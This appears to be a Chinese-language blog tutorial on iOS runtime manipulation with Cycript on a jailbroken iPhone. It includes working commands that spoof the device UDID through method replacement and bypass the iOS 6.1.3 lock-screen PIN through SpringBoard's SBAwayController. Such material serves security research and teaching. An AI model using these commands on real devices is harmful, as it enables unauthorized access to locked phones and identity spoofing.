基本上所有的iOS应用都是用Objective-C编写的。所有这些应用都使用Cocoa，Cocoa在Objective-C上面，提供更高层次的API，使得Mac和iOS开发变得更容易一些。Cocoa也给应用提供了一个运行时环境。

gdb 在iOS7 ar64上暂时无法使用，使用gdb-1821可以跑起来

iOS runtime攻击，目前流行的有两种方式，一种是动态链接库注入，通过编写定制的dylib文件与设置DYLD_INSERT_LIBRARIES环境变量来修改API方法的实现（可参照Machook-DYLD_INSERT_LIBRARIEShttp://danqingdani.blog.163.com/blog/static/186094195201311105254605/ )；还有一种方法就是利用objective－c runtime的消息机制的特性，特别是objc_msgSend，来操作应用，其中以cycript这种混合了objective-c与javascript语法的工具为翘楚。

Cycript说明

Cycript是一个处理Objective-C语法的javascript解释器，这意味着我们能够在一个命令中用Objective-C或者javascript，甚至2者兼用。它能够hook正在运行的进程，能够在运行时修改应用的很多东西。使用Cycript有如下好处：

- 1.我们能够hook正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第3方库，甚至程序的delegate的名称。

- 2.对于一个特定的类，例如View Controller,App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。

- 3.我们能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。

- 4.我们能够在运行时修改实例变量的值。

- 5.我们能够执行Method Swizzling，例如替换一个特定方法的实现。

- 6.我们可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。

伪造UDID（UIDevice类说明）

第一步：选择待操作的进程

maxde-iPhone:~ root# cycript -p 1301 （可以是进程id，也可以是进程名）

第二步：获得当前设备的UDID

cy# [[UIDevice currentDevice]uniqueIdentifier];

@"95ddb8d74eb3a4f9c5e6ff1cc03437a5f46f2416"

第三步：替换uniqueIdentifier实现方法的实现

cy#UIDevice.messages['uniqueIdentifier'] = function(){ return @"DQ430";}

function () {returnInstance.box("DQ430");}

第四步：检查替换后的UDID获取结果

cy# [[UIDevice currentDevice]uniqueIdentifier];

@"DQ430"

cycript只在本次有效，退出后再进入替换UDID失效

iOS绕过锁屏密码(iOS 6.1.3)

看过一个Hook掉SBAwayController，替换其中的SBAwayController.messages['isPasswordProtected']为function(){return NO;}，然后利用[SBAwayController.sharedAwayControllerunlockWithSound:1]对有锁屏密码的设备进行解锁，发现当Hook掉SBAwayController的实例后，运行报错：

cy#[SBAwayController.sharedAwayController isPasswordProtected]

Error: unrecognized selectorisPasswordProtected sent to object 0x1e5d2630

用class-dump-z导出了iOS6 SpringBoard的headers，在SBAwayController里面压根没有发现isPasswordProtected

这个方法不适用于iOS6，ios6.x.x和ios5.x.x很多方法发生了变化

搜索搜了下pass这个关键字发现了这个方法：

-(void)unlockWithSound:(BOOL)arg1bypassPinLock:(BOOL)arg2;

这个方法是解锁的方法，重载了-(void)unlockWithSound:(BOOL)arg1；这个方法，第一个参数arg1是否发出解锁声音，第二个arg2是是否跳过锁屏密码。

Testing-teki-iPhone:~ root# cycript -p4427

cy# [SBAwayController.sharedAwayControllerunlockWithSound:1 bypassPinLock:1]

可以绕过Pin进入界面，前提是在有App打开的情况下，否则还是无法绕过Pin
